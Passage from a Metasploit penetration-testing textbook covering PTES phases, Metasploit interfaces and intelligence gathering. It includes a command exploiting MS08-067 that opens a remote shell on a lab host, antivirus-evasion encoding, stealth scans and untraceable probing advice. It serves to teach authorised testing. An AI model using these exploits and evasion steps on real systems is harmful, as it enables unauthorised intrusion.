+overnight; it takes years of practice and real-world experience to be come proficient.
+Currently, there is a shift in the wa y people regard and define penetra-
+tion testing within the security industry. The Penetration Testing Execution 
+Standard (PTES)  is redefining the penetration test in ways that will affect 
+both new and experienced penetration te sters, and it has been adopted by 
+several leading members of the security  community. Its char ter is to define 
+and raise awareness about what a true pe netration test means by establishing 
+a baseline of fundamental principles re quired to conduct a penetration test. 
+If you’re new to penetration testin g or unfamiliar with PTES, visit http://
+www.pentest-standard.org/  to learn more about it.
+
+2 Chapter 1The Phases of the PTES
+PTES phases are designed to define a penetration test and assure the client 
+organization that a standardized level of effort will be expended in a pene-
+tration test by anyone co nducting this type of a ssessment. The standard is 
+divided into seven categories with differ ent levels of effort required for each, 
+depending on the organization under attack.
+Pre-engagement Interactions
+Pre-engagement interactions  typically occur when you discuss the scope and terms 
+of the penetration test with your client . It is critical during pre-engagement 
+that you convey the goals of the engage ment. This stage also serves as your 
+opportunity to educate your customer ab out what is to be expected from a 
+thorough, full-scope penetr ation test—one without restrictions regarding what 
+can and will be tested during the engagement.
+Intelligence Gathering
+In the intelligence gathering  phase, you will gather any information you can 
+about the organizati on you are attacking by us ing social-media networks, 
+Google hacking, footprinting the target, and so on. One of the most impor-tant skills a penetration tester can have is the ability to learn about a target, 
+including how it behaves, how it operates, and how it ultimately can be attacked. The information that you gather about your target will give you valuable 
+insight into the types of security controls in place.
+During intelligence gathering, you a ttempt to identify what protection 
+mechanisms are in place at the target by  slowly starting to  probe its systems. 
+For example, an organization will often on ly allow traffic on a certain subset of 
+ports on externally facing devices, an d if you query the organization on any-
+thing other than a whitelisted port, you wi ll be blocked. It is generally a good 
+idea to test this blocking behavior by initially probing from an expendable IP 
+address that you are willing to have bl ocked or detected. The same holds true 
+when you’re testing web applications, where, after a cert ain threshold, the 
+web application firewalls will block you from making further requests.
+To remain undetected during these so rts of tests, you can perform your 
+initial scans from IP address ranges that  can’t be linked back to you and your 
+team. Typically, organizati ons with an external pr esence on the Internet 
+experience attacks every day, and your initial probing will likely be an unde-
+tected part of the background noise.
+NOTE In some cases, it might make sense to run very noisy scans from an entirely different IP 
+range other than the one you will be using for the main attack. This will help you deter-
+mine how well the organization responds to the tools you are using.
+Threat Modeling
+Threat modeling  uses the information you acquir ed in the intelligence-gathering 
+phase to identify any existing vulnerab ilities on a target system. When perform-
+ing threat modeling, you will determin e the most effective attack method, 
+
+The Absolute Basics of Penetration Testing 3the type of information you are after,  and how the organization might be 
+attacked. Threat modeling involves lookin g at an organization as an adversary 
+and attempting to exploit weak nesses as an attacker would.
+Vulnerability Analysis
+Having identified the most viable attack methods, you need to consider how 
+you will access the target. During vulnerability analysis , you combine the infor-
+mation that you’ve learned from the pr ior phases and use it to understand 
+what attacks might be viable. Among othe r things, vulnerability analysis takes 
+into account port and vuln erability scans, data gathered by banner grabbing, 
+and information collected during intelligence gathering.
+Exploitation
+Exploitation  is probably one of the most glam orous parts of a penetration test, 
+yet it is often done with brute force ra ther than with precision. An exploit 
+should be performed only when you know almost beyond a shadow of a doubt that a particular exploit will be successful. Of course, unforeseen protective measures might be in place on the targ et that prevent a particular exploit 
+from working—but before you trigger a vulnerability, you should know that 
+the system is vulnerable. Blindly firing  off a mass onslaught of exploits and 
+praying for a shell isn’t productive; it is noisy and provides little if any value to you as a penetration tester or to your client. Do your homework first, and then launch well-researched exploi ts that are likely to succeed.
+Post Exploitation
+The post exploitation  phase begins after you have  compromised one or more 
+systems—but you’re not even close to being done yet.
+Post exploitation is a critical component in any penetration test. This is 
+where you differentiate yourself from the average, run-of-the-mill hacker and actually provide valuable information and intelligence from your penetration 
+test. Post exploitation targets specific sy stems, identifies critical infrastructure, 
+and targets information or data that th e company values most and that it has 
+attempted to secure. When you exploit one system after another, you are try-
+ing to demonstrate attacks that woul d have the greatest business impact.
+When attacking systems in post expl oitation, you should take the time 
+to determine what the various systems do  and their different user roles. For 
+example, suppose you compromise a doma in infrastructure system and you’re 
+running as an enterprise administrator or have domain administrative-level 
+rights. You might be king of the doma in, but what about the systems that 
+communicate with Active Directory? Wh at about the main financial applica-
+tion that is used to pay employees? Could you compromise that system, and 
+then, on the next pay cycle, have it route all the money out of the company to an offshore account? How about the target’s intell ectual property?
+
+4 Chapter 1Suppose, for example, that your cl ient is a large software development 
+shop that ships custom-coded applicat ions to customers for use in manufac-
+turing environments. Can you backdoor  their source code and essentially 
+compromise all of their cu stomers? What would that do to harm their brand 
+credibility?
+Post exploitation is one of those tric ky scenarios in which you must take 
+the time to learn what information is av ailable to you and then use that infor-
+mation to your benefit. An  attacker would generally spend a significant amount 
+of time in a compromised system doing the same. Think like a malicious attacker—be creative, adapt quickly, and rely on your wits instead of auto-
+mated tools.
+Reporting
+Reporting  is by far the most important element of a penetration test. You will 
+use reports to communicate what you di d, how you did it, and, most impor-
+tant, how the organization should fix the vulnerabilities discovered during 
+the penetration test.
+When performing a penetration test, you’re working from an attacker’s 
+point of view, something that organiza tions rarely see. The information you 
+obtain during a test is vital to the su ccess of the organization’s information 
+security program and in st opping future attacks. As you compile and report 
+your findings, think about how the orga nization can use your findings to 
+raise awareness, remediate the issues di scovered, and improve overall security 
+rather than just patch the technical vulnerabilities.
+At a minimum, divide yo ur report into an exec utive summary, executive 
+presentation, and technical findings. The technical findings will be used by 
+the client to remediate security holes, bu t this is also where the value lies in a 
+penetration test. For example, if you find a SQL injection vulnerability in the client’s web-based applications, you mi ght recommend that your client sani-
+tize all user input, leverage paramete rized SQL queries, run SQL as a limited 
+user account, and turn on custom error messages.
+After the client implements your recommendations and fixes the one 
+specific SQL injection vuln erability, are they really protected from SQL injec-
+tion? No. An underlying problem likely caused the SQL injection vulnerability 
+in the first place, such as  a failure to ensure that third-party applications are 
+secure. Those will need to be fixed as well.
+Types of Penetration Tests
+Now that you have a basic understanding of the seven PTES categories, let’s examine the two main types of penetration tests: overt and covert.  An overt 
+pen test, or “white hat” test, occurs with the organization’s full knowledge; 
+covert tests are designed to simulate the actions of an unknown and unan-
+nounced attacker. Both tests offe r advantages and disadvantages.
+
+The Absolute Basics of Penetration Testing 5Overt Penetration Testing
+Using overt penetration testing, you work with the organization to identify 
+potential security threats, and the organi zation’s IT or security team shows you 
+the organization’s systems. The one main benefit of an overt test is that you 
+have access to insider knowledge and can launch attacks without fear of 
+being blocked. A potential downside to overt testing is that overt tests might 
+not effectively test the c lient’s incident response program or identify how 
+well the security program detects certai n attacks. When ti me is limited and 
+certain PTES steps such as  intelligence gathering are out of scope, an overt 
+test may be your best option.
+Covert Penetration Testing
+Unlike overt testing, sanctioned covert penetration testing is  designed to sim-
+ulate the actions of an attacker and is performed without the knowledge of 
+most of the organization. Covert test s are performed to test the internal 
+security team’s ability to dete ct and respond to an attack.
+Covert tests can be cost ly and time consuming, and they require more 
+skill than overt tests. In the eyes of penetration testers in the security industry, the covert scenario is often preferred be cause it most closely simulates a true 
+attack. Covert attacks rely on your ab ility to gain information by reconnais-
+sance. Therefore, as a covert tester, you will typically not attempt to find a 
+large number of vulnerabilities in a targ et but will simply attempt to find the 
+easiest way to gain access to a system, undetected.
+Vulnerability Scanners
+Vulnerability scanners are automated to ols used to identify security flaws 
+affecting a given system or application.  Vulnerability scanners typically work 
+by fingerprinting  a target’s operating system (t hat is, identifying the version 
+and type) as well as any services that are running. Once you have fingerprinted the target’s operating system, you use the vulnerability scanner to execute 
+specific checks to determine whether vulnerabilities exist. Of course, these checks are only as good as their crea tors, and, as with any fully automated 
+solution, they can sometimes miss or mi srepresent vulnerabilities on a system.
+Most modern vulnerability scanners do an amazing job of minimizing 
+false positives, and many organizations us e them to identify out-of-date systems 
+or potential new exposures that might be exploited by attackers.
+Vulnerability scanners play a very im portant role in penetration testing, 
+especially in the case of overt testing, which allows you to launch multiple attacks without havi ng to worry about avoiding detection. The wealth of 
+knowledge gleaned from vulnerability scan ners can be invaluable, but beware 
+of relying on them too heavily. The beauty  of a penetration test is that it can’t 
+be automated, and attacking systems su ccessfully requires that you have 
+knowledge and skills. In most cases, when you become a skilled penetration 
+tester, you will rarely use a vulnerability scanner but will rely on your knowl-edge and expertise to compromise a system.
+
+6 Chapter 1Pulling It All Together
+If you’re new to penetration testing or haven’t really adopted a formal 
+methodology, study the PTES. As with  any experiment, when performing a 
+penetration test, ensure that you have a refined and adaptable process that is 
+also repeatable. As a penetr ation tester, you need to ensure that your intelli-
+gence gathering and vulnerab ility analysis are as expe rt as possible, to give 
+you an advantage in adapting to sc enarios as they present themselves.
+
+METASPLOIT BASICS
+When you encounter the Me tasploit Framework (MSF) 
+for the first time, you might be overwhelmed by its many interfaces, options, ut ilities, variables, and mod-
+ules. In this chapter, we’ll fo cus on the basics that will 
+help you make sense of the big picture. We’ll review 
+some basic penetration te sting terminology and then
+briefly cover the various user interfaces that Metasploit has to offer. Meta-
+sploit itself is free, open  source software, with many contributors in the secu-
+rity community, but two commercial Metasploit versions are also available.
+When first using Metasploit, it’s impo rtant not to get hung up on that new-
+est exploit; instead, focus on how Metasploit functions and what commands you used to make the exploit possible.
+Terminology
+Throughout this book, we’ll use variou s terms that first bear some explana-
+tion. The majority of the following basi c terms are defined in the context of 
+Metasploit, but they are generally the sa me throughout the security industry.
+
+8 Chapter 2Exploit
+An exploit  is the means by which an attacker, or pen tester for that matter, takes 
+advantage of a flaw within a system, an application, or a service. An attacker 
+uses an exploit to attack a system in a way that results in a particular desired 
+outcome that the developer never intend ed. Common exploits include buffer 
+overflows, web application vulnerabilit ies (such as SQL injection), and con-
+figuration errors.
+Payload
+A payload  is code that we want the system to execute and that is to be selected 
+and delivered by the Fram ework. For example, a reverse shell  is a payload that 
+creates a connection from the target ma chine back to the attacker as a Win-
+dows command prompt (see Chapter 5), whereas a bind shell  is a payload that 
+“binds” a command prompt to a listening port on the target machine, which the attacker can then  connect. A payload could also be something as simple as 
+a few commands to be executed on  the target operating system.
+Shellcode
+Shellcode is a set of instructions used as a payload when exploitation occurs. 
+Shellcode is typically written in assemb ly language. In most cases, a command 
+shell or a Meterpreter shell will be prov ided after the series  of instructions 
+have been performed by the target machine, hence the name.
+Module
+A module  in the context of this book is a piece of software that can be used by 
+the Metasploit Framework. At time s, you may require the use of an exploit 
+module , a software component that conduc ts the attack. Other times, an 
+auxiliary module  may be required to perform an  action such as scanning or 
+system enumeration. These interchang eable modules are the core of what 
+makes the Framework so powerful.
+Listener
+A listener is a component within Metasploit that  waits for an incoming connection 
+of some sort. For example, after the targ et machine has been exploited, it may 
+call the attacking machine over the Inte rnet. The listener handles that connec-
+tion, waiting on the attack ing machine to be contacte d by the exploited system.
+Metasploit Interfaces
+Metasploit offers more than one interf ace to its underlying functionality, 
+including console, command line, and gr aphical interfaces. In addition to 
+these interfaces, utilities provide direct  access to functions that are normally 
+internal to the Metasploit Framework.  These utilities can be invaluable for 
+exploit development and situations for which you do not need the flexibility 
+of the entire Framework.
+
+Metasploit Basics 9MSFconsole
+Msfconsole  is by far the most popular part of the Metasploit Framework, 
+and for good reason. It is one of th e most flexible, feature-rich, and well-
+supported tools within the Framework. Msfconsole  provides a handy all-in-one 
+interface to almost every option and se tting available in the Framework; it’s 
+like a one-stop shop for all of your exploitation dreams. You can use msfconsole  
+to do everything, including launching an  exploit, loading auxiliary modules, 
+performing enumeration, creating list eners, or running mass exploitation 
+against an entire network.
+Although the Metasploit Framework is  constantly changing, a subset of 
+commands remain relatively consta nt. By mastering the basics of msfconsole , 
+you will be able to keep up with any changes. To illustrate the importance of 
+learning msfconsole , it will be used in nearly every chapter of the book.
+Starting MSFconsole
+To launch msfconsole , enter msfconsole  at the command line:
+root@bt:/# cd /opt/framework3/msf3/
+root@bt:/opt/framework/msf3# msfconsole
+< metasploit > ------------       \   ,__,        \  (oo)____           (__)    )\              ||--|| *
+msf >
+To access msfconsole ’s help files, enter help followed by the command 
+which you are interested in. In the next example, we are looking for help for the command 
+connect , which allows us to communicate with a host. The 
+resulting documentation list s usage, a description of the tool, and the various 
+option flags.
+msf > help connect
+We’ll explore MSFConsole in greater depth in the chapters that follow.
+MSFcli
+Msfcli  and msfconsole  take very different approach es to providing access to the 
+Framework. Where msfconsole  provides an interactive way to access all features 
+in a user-friendly manner, msfcli  puts the priority on scripting and interpret-
+ability with other console-based tools.  Instead of providing a unique inter-
+preter to the Framework, msfcli  runs directly from the command line, which 
+allows you to redirect output from other tools into msfcli  and direct msfcli  
+output to other command-line tools. Msfcli  also supports the launching of 
+exploits and auxiliary modules, and it  can be convenient when testing mod-
+ules or developing new exploits for the Framework. It is a fantastic tool for 
+
+10 Chapter 2unique exploitation when you know exactly which exploit and options you 
+need. It is less forgiving than msfconsole , but it offers some basic help (includ-
+ing usage and a list of mo des) with the command msfcli -h , as shown here:
+root@bt:/opt/framework3/msf3# msfcli -h
+Usage: /opt/framework3/msf3/msfcli <exploit_name> <option=value> [mode]==============================================================================
+Mode Description
+   ----     ---------------
+(H)elp You're looking at it, baby!
+   (S)ummary Show information about this module
+(O)ptions Show available options for this module(A)dvanced Show available advanced options for this module(I)DS Evasion Show available ids evasion options for this module(P)ayloads Show available payloads for this module(T)argets Show available targets for this exploit module(AC)tions Show available actions for this auxiliary module(C)heck Run the check routine of the selected module(E)xecute Execute the selected module
+root@bt:/opt/framework3/msf3#
+Sample Usage
+Let’s take a look at how you might use msfcli . Don’t worry about the details; 
+these examples are intended to give yo u a sense of how you might work with 
+this interface.
+When you are first learni ng Metasploit or whenever you get stuck, you 
+can see the options available in a module by appending the letter O to the end 
+of the string at whichever point you ar e stuck. For example, in the following 
+listing, we use the O to see the options available for the ms08_067_netapi  module:
+root@bt:/# msfcli windows/smb/ms08_067_netapi O
+[*] Please wait while we load the module tree...
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOST    0.0.0.0          yes       The target address   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+You can see that the module  requires three options: RHOST , RPORT , and 
+SMPIPE . Now, by adding a P, we can check for available payloads:
+root@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P
+[*] Please wait while we load the module tree...
+
+Metasploit Basics 11Compatible payloads
+===================
+   Name Description
+   ---- -----------   generic/debug_trap Generate a debug trap in the target process
+   generic/shell_bind_tcp Listen for a connection and spawn a command shell
+Having set all the required options for our exploit and selecting a pay-
+load, we can run our exploit by passing the letter E to the end of the msfcli  
+argument string, as shown here:
+root@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 PAYLOAD=windows/shell/bind_tcp E
+[*] Please wait while we load the module tree...[*] Started bind handler[*] Automatically detecting the target...[*] Fingerprint: Windows XP Service Pack 2 - lang:English[*] Selected Target: Windows XP SP2 English (NX)[*] Triggering the vulnerability...[*] Sending stage (240 bytes)[*] Command shell session 1 opened (192.168.1.101:46025 -> 192.168.1.155:4444)
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\WINDOWS\system32>
+We’re successful, because we ha ve received a Windows command 
+prompt from the remote system.
+Armitage
+The armitage  component of Metasploit is a fully interactive graphical user 
+interface created by Raphael Mudge. Th is interface is highly impressive, 
+feature rich, and available for free. We won’t be covering armitage  in depth, 
+but it is definitely worth mentioning as something to explore. Our goal is 
+to teach the ins and outs of Metasplo it, and the GUI is awesome once you 
+understand how the Framework actually operates.
+Running Armitage
+To launch armitage , run the command armitage . During startup, select Start 
+MSF , which will allow armitage  to connect to your Metasploit instance.
+root@bt:/opt/framework3/msf3# armitage
+After armitage  is running, simply click a me nu to perform a particular 
+attack or access other Meta sploit functionality. For example, Figure 2-1 shows 
+the browser (clien t-side) exploits.
+
+12 Chapter 2Figure 2-1: The armitage ’s browser exploit menu
+Metasploit Utilities
+Having covered Metasploit’s three main interfaces, it’s time to cover a few 
+utilities. Metasploit’s utiliti es are direct interfaces to particular features of the 
+Framework that can be useful in specific  situations, especially in exploit devel-
+opment. We will cover some of the mo re approachable utilities here and 
+introduce additional on es throughout the book.
+MSFpayload
+The msfpayload  component of Metasploit allows you to generate shellcode, 
+executables, and much more for use in  exploits outside of the Framework. 
+Shellcode can be generated in many formats including C, Ruby, JavaScript, 
+and even Visual Basic for Applications. Each output format will be useful in 
+various situations. For exam ple, if you are working with a Python-based proof 
+of concept, C-style output might be best; if you are working on a browser exploit, a JavaScript output format migh t be best. After you have your desired 
+output, you can easily insert the payload directly into an HTML file to trigger 
+the exploit.
+
+
+Metasploit Basics 13To see which options the utility takes, enter msfpayload -h  at the command 
+line, as shown here:
+root@bt:/# msfpayload -h
+As with msfcli , if you find yourself stuck on  the required options for a pay-
+load module, append the letter O on the command line for a list of required 
+and optional variables, like so:
+root@bt:/# msfpayload windows/shell_reverse_tcp O
+We will dive much deeper into msfpayload  as we explore exploit develop-
+ment in later chapters.
+MSFencode
+The shellcode generated by msfpayload  is fully functional, but it contains sev-
+eral null characters that , when interpreted by many programs, signify the 
+end of a string, and this will cause the code to terminate before completion. In other words, those 
+x00s and xffs can break your payload!
+In addition, shellcode traversing a ne twork in cleartext is likely to be 
+picked up by intrusion detection syst ems (IDSs) and antivirus software. To 
+address this problem, Metasp loit’s developers offer msfencode , which helps 
+you to avoid bad characters and evade antivirus and IDSs by encoding the 
+original payload in a way that does not include “bad” characters. Enter 
+msfencode -h  to see a list of msfencode  options.
+Metasploit contains a number of differ ent encoders for specific situations. 
+Some will be useful when you can use only alphanumeric characters as part 
+of a payload, as is the case with many f ile format exploits or other applications 
+that accept only printable characters as input, while others are great general 
+purpose encoders that do well in every situation.
+When in doubt, though, you really can’t go wrong with the x86/shikata_
+ga_nai  encoder, the only encoder with the rank of Excellent, a measure of 
+the reliability and stability of a module. In the context of an encoder, an Excellent ranking implies that it is on e of the most versatile encoders and 
+can accommodate a greater degree of fine-tuning than other encoders. To 
+see the list of encoders available, append 
+-l to msfencode  as shown next. The 
+payloads are ranked in order of reliability.
+root@bt:~# msfencode -l
+Nasm Shell
+The nasm_shell.rb  utility can be handy when you’re trying to make sense of 
+assembly code, especially if, during ex ploit development, you need to iden-
+tify the opcodes  (the assembly instructions) for a given assembly command.
+
+14 Chapter 2For example, here we run the tool and request the opcodes for the jmp 
+esp command, which nasm_shell  tells us is FFE4.
+root@bt:/opt/framework3/msf3/tools# ./nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+Metasploit Express and Metasploit Pro
+Metasploit Express and Metasploit Pr o are commercial web interfaces to 
+the Metasploit Framework. These utilit ies provide substantial automation 
+and make things easier for new users, while still providing full access to the Framework. Both products also provid e tools that are unavailable in the 
+community editions of the Framework,  such as automated password brute 
+forcing and automated website attacks. In addition, a nice reporting back-
+end to Metasploit Pro can speed up on e of the least popular aspects of 
+penetration testing: writing the report.
+Are these tools worth purchasing? On ly you can make that choice. The 
+commercial editions of Metasploit are intended for professional penetration 
+testers and can ease many of the more routine aspects of the job, but if the time savings from the automations in these commercial products are useful 
+for you, they might justify the purchase price. 
+Remember, however, as you automate your work, that humans are better 
+at identifying attack vect ors than automated tools.
+Wrapping Up
+In this chapter, you learned a little bit of the basics of the Metasploit Frame-
+work. As you progress through this book, you will begin using these tools in a much more advanced capacity. You’ll fi nd a few different ways to accomplish 
+the same tasks using differen t tools. It will ultimately be up to you to decide 
+which tool best suits your needs.
+Now that you have the basics under co ntrol, let’s move to the next phase 
+of the pen testing process: discovery.
+
+INTELLIGENCE GATHERING
+Intelligence gathering fo llows the pre-engagement 
+activities as the second step  in a penetration test. Your 
+goals during intelligence ga thering should be to gain 
+accurate information about your targets without reveal-ing your presence or your intentions, to learn how the 
+organization operates, and to  determine the best route
+of entry. If you don’t do a thorough job of intelligence gathering, you may 
+miss vulnerable systems or viable attack vectors. It takes ti me and patience to 
+sort through web pages, perform Goog le hacking, and map systems thor-
+oughly in an attempt to understand the infrastructure of a particular target. 
+Intelligence gathering requires carefu l planning, research , and, most impor-
+tantly, the ability to think like an attack er. At this step, you will attempt to col-
+lect as much information about the target environment as possible. This can be an expansive amount of information, and even the most trivial data gath-ered during this stage can prove useful later on, so pay attention.
+Before you begin intelligence gatherin g, consider how you will record 
+everything you do and the results you ac hieve. You must remember and record 
+
+16 Chapter 3as many details of your penetration test as possible. Most security professionals 
+quickly learn that detailed notes can mean the difference between a successful and a failed penetration test. Just as a scientist needs to achieve reproducible 
+results, other experienced penetration testers should  be able to reproduce 
+your work using your documentation alone.
+Intelligence gathering is arguably th e most important aspect of a pene-
+tration test, because it provides the foun dation for all work that follows. When 
+recording your work, be methodical, ac curate, and precise. And, as stated 
+earlier, be sure that before you fire off your exploits, you have learned all 
+that you can about your target.
+The excitement for most people comes in expl oiting systems and getting 
+to root, but you need to learn to walk before you can run.
+WARNING If you follow the procedures in this chapte r, you can actually damage your system and 
+your target’s system, so be sure to set up  your test environment now. (For help, see 
+Appendix A.) Many of the examples in these chapters can be destructive and make a 
+target system unusable. The ac tivities discussed in this ch apter could be considered 
+illegal if they are undertaken by someone with bad intentions, so follow the rules and 
+don’t be stupid.
+Passive Information Gathering
+By using passive  and indirect  information gathering, you can discover informa-
+tion about targets without touching th eir systems. For example, you can use 
+these techniques to identify network boundaries, identify the network main-
+tainers, and even learn what operating system and web server software is in use on the target network.
+Open source intelligence (OSINT)  is a form of intelligence collection that 
+uses open or readily available informat ion to find, select, and acquire infor-
+mation about a target. Several tools make passive information gathering 
+almost painless, includin g complex tools such as Yeti and the humble whois . 
+In this section, we’ll explore the pr ocess of passive in formation gathering 
+and the tools that you might use for this step.
+Imagine, for example, an attack against http://www.secmaniac.net/ . Our 
+goal is to determine, as  a part of a penetration test, what systems the com-
+pany owns and what systems we can a ttack. Some systems may not be owned 
+by the company and could be consider ed out of scope an d unavailable for 
+attack.
+whois Lookups
+Let’s begin by us ing Back|Track’s whois  lookup to find the names of 
+secmaniac.net ’s domain servers.
+msf > whois secmaniac.net
+[*] exec: whois secmaniac.net
+. . . SNIP . . .
+
+Intelligence Gathering 17Registered through: GoDaddy.com, Inc. (http://www.godaddy.com)
+   Domain Name: SECMANIAC.NET      Created on: 03-Feb-10      Expires on: 03-Feb-12      Last Updated on: 03-Feb-10
+XDomain servers in listed order:
+      NS57.DOMAINCONTROL.COM
+      NS58.DOMAINCONTROL.COM
+We learn at X that the Domain Name System (DNS) servers are hosted 
+by DOMAINCONTROL.COM , so this is a good exam ple of systems that would 
+not be included in a penetration test be cause we would have no authority to 
+attack them. In most large organization s, the DNS servers are housed within 
+the company and are viable attack vect ors. Zone transfers and similar DNS 
+attacks can often be used to learn more about a network from both the inside and outside. In this  scenario, because DOMAINCONTROL.COM  is not owned 
+by secmaniac.net , we should not attack these sy stems and will instead move on 
+to a different attack vector.
+Netcraft
+Netcraft ( http://searchdns.netcraft.com/ ) is a web-based tool that we can use to find 
+the IP address of a server hosting a part icular website, as shown in Figure 3-1.
+Figure 3-1: Use Netcraft to fi nd the IP address of the server hosting a particular website.
+Having identified secmaniac.net ’s IP address as 75.118.185.142, we do 
+another whois  lookup on that IP address:
+msf > whois 75.118.185.142
+[*] exec: whois 75.118.185.142WideOpenWest Finance LLC WIDEOPENWEST (NET-75-118-0-0-1)                                  75.118.0.0 - 75.118.255.255WIDEOPENWEST OHIO WOW-CL11-1-184-118-75 (NET-75-118-184-0-1)
+                                  75.118.184.0 - 75.118.191.255
+We see from the whois  lookup and a quick search that this IP 
+(WIDEOPENWEST ) appears to be a legitimate service provider. While 
+the actual subnet range isn’t specifically registered to secmaniac.net  or 
+secmaniac.com , we can tell that this site a ppears to be hosted inside the 
+author’s home, because the IP block appears to be part of a residential range.
+
+
+18 Chapter 3NSLookup
+To get additional server information,  we’ll use Back|Track to leverage nslookup , a 
+tool built into most operating sy stems, to find information about secmaniac.net .
+root@bt:~# nslookup
+set type=mx
+> secmaniac.net
+Server:         172.16.32.2Address:        172.16.32.2#53
+Non-authoritative answer:
+secmaniac.net   mail exchanger = 10 mailstore1.secureserver.net.
+secmaniac.net   mail exchanger = 0 smtp.secureserver.net.
+We see in this listing that the mail servers are pointing to mailstore1
+.secureserver.net  and smtp.secureserver.net . Some quick research on these mail 
+servers tells us that this website is ho sted by a third party, which would not 
+be within the scope of our penetration test.
+At this point, we have gathered some  valuable information that we might 
+be able to use against the target late r on. Ultimately, however, we have to 
+resort to active information gatherin g techniques to determine the actual 
+target IP, which is 75.118.185.142.
+NOTE Passive information gathering is an art that is not easily mastered in just a few pages 
+of discussion. See the Penetration Testing Executio n Standard (PTES; http://
+www.pentest-standard.org/)  for a list of potential ways to perform additional pas-
+sive intelligence gathering.
+Active Information Gathering
+In active information gathering, we inte ract directly with a system to learn 
+more about it. We might, for example, conduct port scans for open ports on 
+the target or conduct scans to determine what services are running. Each system 
+or running service that we  discover gives us another opportunity for exploita-
+tion. But beware: If you get careless while active information gathering, you might be nabbed by an IDS or intrus ion prevention system (IPS)—not a 
+good outcome for the covert penetration tester.
+Port Scanning with Nmap
+Having identified the target IP range with passive information gathering as 
+well as the secmaniac.net  target IP address, we can begin to scan for open ports 
+on the target by port scanning , a process whereby we meticulously connect to 
+ports on the remote host to identify those that are active. (Obviously, in a 
+larger enterprise, we would have multip le IP ranges and things to attack 
+instead of only one IP.)
+Nmap  is, by far, the most popular port scanning tool. It integrates with 
+Metasploit quite elegantly, storing sc an output in a database backend for 
+
+Intelligence Gathering 19later use. Nmap  lets you scan hosts to identify  the services running on each, 
+any of which might offer a way in.
+For this example, let’s leave secmaniac.net  behind and turn to the virtual 
+machine described in Appendix A, with IP address 172.16.32.131. Before we get started, take a quick look at the basic nmap  syntax by entering 
+nmap from 
+the command line on your Back|Track machine. 
+You’ll see immediately that nmap  has a quite a few options, but you’ll use 
+just a few of them for the most part.
+One of our preferred nmap  options is -sS. This runs a stealth TCP scan 
+that determines whether a specific TCP- based port is open. Another preferred 
+option is -Pn, which tells nmap  not to use ping to determine whether a system 
+is running; instead, it considers all host s “alive.” If you’re performing Internet-
+based penetration tests, you should us e this flag, becaus e most networks 
+don’t allow Internet Control Message Pr otocol (ICMP), which is the protocol 
+that ping uses. If you’re performing this  scan internally, you can probably 
+ignore this flag.
+Now let’s run a quick nmap  scan against our Windows XP machine using 
+both the -sS and -Pn flags.
+root@bt:~# nmap -sS -Pn 172.16.32.131
+Nmap scan report for 172.16.32.131Host is up (0.00057s latency).Not shown: 990 closed portsPORT     STATE SERVICE21/tcp   open  ftp25/tcp   open  smtp80/tcp   open  http135/tcp  open  msrpc139/tcp  open  netbios-ssn443/tcp  open  https445/tcp  open  microsoft-ds1025/tcp open  NFS-or-IIS1433/tcp open  ms-sql-s3389/tcp open  ms-term-serv
+Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
+As you can see, nmap  reports a list of open port s, along with a description 
+of the associated service for each.
+For more detail, try using the -A flag. This option wi ll attempt advanced 
+service enumeration and banner grabbing, which may give you even more details about the target system. For exampl e, here’s what we’d see if we were 
+to call nmap  with the 
+-sS and -A flags, using our same target system:
+root@bt:~# nmap -Pn -sS -A 172.16.32.131
+Nmap scan report for 172.16.32.131Host is up (0.0035s latency).Not shown: 993 closed portsPORT     STATE SERVICE      VERSION135/tcp  open  msrpc        Microsoft Windows RPC139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
+
+20 Chapter 3777/tcp  open  unknown
+1039/tcp open  unknown1138/tcp open  msrpc        Microsoft Windows RPC1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM
+. . . SNIP . . .Device type: general purpose
+Running: Microsoft Windows XP|2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hopService Info: OS: Windows
+Host script results:
+|_nbstat: NetBIOS name: V-MAC-XP, NetBIOS user: <unknown>, NetBIOS MAC:
+00:0c:29:c9:38:4c (VMware)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   Name: WORKGROUP\V-MAC-XP
+Working with Databases in Metasploit
+When you’re running a complex penetratio n test with a lot of targets, keep-
+ing track of everything can be a chal lenge. Luckily, Metasploit has you cov-
+ered with expansive support fo r multiple database systems.
+To ensure that database support is available for your system, you should 
+first decide which database system yo u want to run. Metasploit supports 
+MySQL and PostgreSQL; because PostgreSQL  is the default, we’ll stick with 
+it in this discussion.
+First, we start the database subsys tem using the built-in Back|Track init.d  
+scripts.
+root@bt~# /etc/init.d/postgresql-8.3 start
+After PostgreSQL has started, we te ll the Framework to connect to the 
+database instance. This connection re quires a username, password, name of 
+the host on which the database is running, and the database name we want to use. Back|Track’s default PostgreSQL username is postgres  with the password 
+toor, but we’ll use msfbook  as the database name. Let’s make the connection.
+msf > db_connect postgres:toor@127.0.0.1/msfbook
+If this were the first time we conne cted to the database name, we would 
+see a lot of text output as Metasploit sets up all the necessary tables. Other-wise, the command will return to the 
+msfconsole  prompt.
+Metasploit provides a number of co mmands that we can use to interact 
+with the database, as you’ll see throug hout this book. (For a complete list, 
+enter help.) For now, we’ll use db_status  to make sure that we’re connected 
+correctly.
+
+Intelligence Gathering 21msf > db_status
+[*] postgresql connected to msfbook
+Everything seems to be set up just fine.
+Importing Nmap Results into Metasploit
+When you are working with other team  members, with various individuals 
+scanning at different times and from di fferent locations, it helps to know 
+how to run nmap  on its own and then import its results into the Framework. 
+Next, we’ll examine how to import a basic nmap -generated XML export file 
+(generated with nmap ’s -oX option) into the Framework.
+First, we scan the Window s virtual machine using the -oX option to gener-
+ate a Subnet1.xml  file:
+nmap -Pn -sS -A -oX Subnet1 192.168.1.0/24
+After generating the XML file, we use the db_import  command to import 
+it into our database. We can then verify  that the import worked by using the 
+db_hosts  command, which lists the systems entr ies that have been created, as 
+shown here:
